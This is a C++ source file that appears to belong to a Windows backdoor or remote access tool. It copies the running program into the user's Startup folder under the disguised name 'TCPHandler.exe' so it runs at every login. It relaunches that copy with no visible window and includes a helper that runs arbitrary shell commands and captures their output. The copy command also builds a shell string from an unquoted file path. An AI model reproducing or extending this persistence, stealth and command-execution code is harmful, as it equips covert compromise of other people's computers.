#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Utils.h"

std::string startUpPath = std::string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TCPHandler.exe";

bool isInStartUp(char* filePath)
{
    std::string fileName, startUpFileName;

    fileName = std::string(filePath).substr(std::string(filePath).find_last_of("\\"));
    startUpFileName = startUpPath.substr(startUpPath.find_last_of("\\"));

    /*checking if the files' names are the same*/
    return fileName._Equal(startUpFileName);
}

void copyToStartUp(char* filePath)
{
    std::string command = "copy " + std::string(filePath) + " \"" + startUpPath + "\"";
    executeShell((char*)command.c_str());
}

void executeStartUpFile()
{
    // additional information
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // set the size of the structures
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    // start the program up
    if(!CreateProcessA
    (
        startUpPath.c_str(),   // the path
        NULL,                // Command line
        NULL,                   // Process handle not inheritable
        NULL,                   // Thread handle not inheritable
        FALSE,                  // Set handle inheritance to FALSE
        CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS,     // Opens file with no console
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi           // Pointer to PROCESS_INFORMATION structure
    ))
        return;
    WaitForSingleObject(pi.hProcess, INFINITE);
    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

std::string executeShell(char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    /*i create a pointer to a "file"*/
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);    

    /*check for errors*/
    if (!pipe)
        throw std::runtime_error("popen() failed!");
    
    /*getting the output of the command*/
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) // I read the data from the buffer 
        result += buffer.data();
   
    return result;
}

